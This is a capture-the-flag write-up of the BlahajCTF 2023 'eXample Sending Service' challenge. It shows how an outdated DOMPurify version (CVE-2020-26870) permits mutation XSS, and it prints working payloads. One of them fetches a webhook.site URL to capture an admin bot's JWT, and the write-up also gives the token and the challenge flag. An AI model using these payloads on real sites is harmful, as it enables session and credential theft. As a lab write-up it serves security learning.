---
title: eXample Sending Service
date: 2023-12-05
tags:
- web
- xss
categories: BlahajCTF 2023
---

> As part of Halogen's cybersecurity exam, Blahaj has to get the flag only accessible by the administrator. But Blahaj cannot even type with his flippers, help him pass!

**Disclaimer: We did not solve the challenge but we were like 3 micrometers away from solving it**

This is another XSS Challenge where you send a message and the admin bot reads the message and sets a header that contains the admin jwt, which can be used to access `/flag`:

{% ccb caption:admin.js gutter1:10-29 lang:js %}
// Just your typical admin bot that reads the message
async function notify(msg) {
    // Launch the browser and open a new blank page
    const browser = await puppeteer.launch({
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ]
    });
    const page = await browser.newPage();

    // Navigate the page to a URL
    page.setExtraHTTPHeaders({
        'Authorization': 'Bearer ' + jwt.sign({
            message: msg,
            username: "admin"
        }, flag)
    });
    await page.goto('http://localhost:3000/read');
}
{% endccb %}

This XSS, however, requires a DOMPurify CVE:

{% ccb caption:app.js gutter1:36-40 lang:js %}
    const message = {
        name: DOMPurify.sanitize(req.body['name']),
        title: DOMPurify.sanitize(req.body['title']),
        body: DOMPurify.sanitize(req.body['message']),
    }
{% endccb %}

DOMPurify CVE Links:
- https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
- https://portswigger.net/daily-swig/dompurify-mutation-xss-bypass-achieved-through-mathml-namespace-confusion
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26870

This is because in the `package.json`, dompurify is only v2.0.16
{% ccb caption:package.json gutter1:11-12 lang:json %}
  "dependencies": {
    "dompurify": "^2.0.16",
{% endccb %}

So we can construct an XSS payload that works locally!

{% ccb lang:html wrapped:true %}
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
{% endccb %}

This would be enough to solve the challenge. However I am dumb:

When I tried testing around some javascript to xss into my https://webhook.site, I realized some of them was being caught by DOMPurify. So I decided to use [JSFuck](https://jsfuck.com/) to encode my payload, but while my XSS worked locally, it did not work on the admin, which lead me to spend most of time searching for how to circumvent this "check". However, it turns out that it was probably because my payload of jsfuck was just too big, so none of the payloads worked. If I did not encrypt my payload into JSFuck and just did something like:

{% ccb lang:html wrapped:true %}
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=fetch('https://webhook.site')&gt;">
{% endccb %}

I would have received the admin jwt:
{% ccb wrapped:true %}
Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXNzYWdlIjp7Im5hbWUiOiJhIiwidGl0bGUiOiJhIiwiYm9keSI6IjxtYXRoPjxtdGV4dD48bWdseXBoPjxzdHlsZT48IS0tPC9zdHlsZT48aW1nIHRpdGxlPVwiLS0-PC9tZ2x5cGg-PGltZ1x0c3JjPTFcdG9uZXJyb3I9ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2Q3ZWU3ODZhLTgwODQtNDM3Ny05OGFiLWZkZDU1MmFiMmQ0ZicpPlwiPlxuPC9tZ2x5cGg-PHRhYmxlPjwvdGFibGU-PC9tdGV4dD48L21hdGg-In0sInVzZXJuYW1lIjoiYWRtaW4iLCJpYXQiOjE3MDE3NjA0MzR9.VZl-aNmRsB4bEPIvdffdS6Rl9DcxLWYkLT5ZORvGAvg 
{% endccb %}

and could have gone on to get the flag: `blahaj{d1d_y0u_f0rg0r_t0_upd4t3?}`
